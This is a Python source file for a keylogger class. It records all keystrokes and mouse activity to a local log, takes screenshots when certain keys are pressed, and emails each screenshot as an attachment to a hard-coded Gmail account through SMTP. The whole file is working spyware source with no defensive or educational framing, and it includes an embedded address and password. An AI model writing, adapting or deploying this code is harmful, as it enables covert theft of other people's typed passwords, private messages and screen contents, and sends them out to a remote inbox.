import logging
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from datetime import datetime

from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
from pynput.keyboard import Key


class KeyLogger:
    def __init__(self, email_address, email_password):
        self.email_address = email_address
        self.email_password = email_password
        self.log_file = None
        self.setup_logger()
        self.dpi = 96

    def setup_logger(self):
        logging.basicConfig(filename='key_inputs.txt', level=logging.INFO,
                            format='%(asctime)s - %(message)s')
        self.log = logging.getLogger()

    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = key
        self.log.info(str(current_key) + " pressed")

        # Take screenshot when a specific key is pressed
        if current_key == "s" or current_key == Key.enter:
            self.take_screenshot()

    def on_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.log.info(f"Mouse {action} at ({x}, {y}) with {button}")

    def on_move(self, x, y):
        x_cm = x / self.dpi * 2.54  # Convert x-coordinate from pixels to centimeters
        y_cm = y / self.dpi * 2.54  # Convert y-coordinate from pixels to centimeters
        self.log.info(f"Mouse moved to ({x_cm:.2f} cm, {y_cm:.2f} cm)")  # Log in centimeters

    def on_scroll(self, x, y, dx, dy):
        x_cm = x / self.dpi * 2.54  # Convert x-coordinate from pixels to centimeters
        y_cm = y / self.dpi * 2.54  # Convert y-coordinate from pixels to centimeters
        dx_cm = dx / self.dpi * 2.54  # Convert horizontal delta from pixels to centimeters
        dy_cm = dy / self.dpi * 2.54  # Convert vertical delta from pixels to centimeters
        self.log.info(
            f"Mouse scrolled at ({x_cm:.2f} cm, {y_cm:.2f} cm) with delta ({dx_cm:.2f} cm, {dy_cm:.2f} cm)")  # Log in centimeters

    def start(self):
        keyboard_listener = Listener(on_press=self.on_press)
        mouse_listener = MouseListener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)

        keyboard_listener.start()
        mouse_listener.start()

        # Wait for the threads to finish
        keyboard_listener.join()
        mouse_listener.join()

    def stop(self):
        # Stop listeners and close the log file
        Listener.stop()
        MouseListener.stop()
        if self.log_file:
            self.log_file.close()

    def send_email(self, subject, message, attachment_path=None):
        msg = MIMEMultipart()
        msg['From'] = self.email_address
        msg['To'] = self.email_address
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        if attachment_path:
            attachment = open(attachment_path, "rb")
            part = MIMEBase('application', 'octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= %s" % os.path.basename(attachment_path))
            msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email_address, self.email_password)
        text = msg.as_string()
        server.sendmail(self.email_address, self.email_address, text)
        self.log.info("Screenshot sent")
        server.quit()

    def take_screenshot(self):
        # Create directory if it doesn't exist
        screenshots_dir = os.path.join(os.getcwd(), 'screenshots')
        if not os.path.exists(screenshots_dir):
            os.makedirs(screenshots_dir)

        # Capture screenshot using Pillow
        screenshot = ImageGrab.grab()

        # Generate unique filename with timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        screenshot_filename = f'screenshot_{timestamp}.png'
        screenshot_path = os.path.join(screenshots_dir, screenshot_filename)

        # Save screenshot to file
        screenshot.save(screenshot_path)
        self.log.info("Screenshot captured")
        self.send_email("Screenshot Captured", "A screenshot has been captured.", screenshot_path)


if __name__ == "__main__":
    keylogger = KeyLogger("dileebandileeban6@gmail.com", "1234")
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()
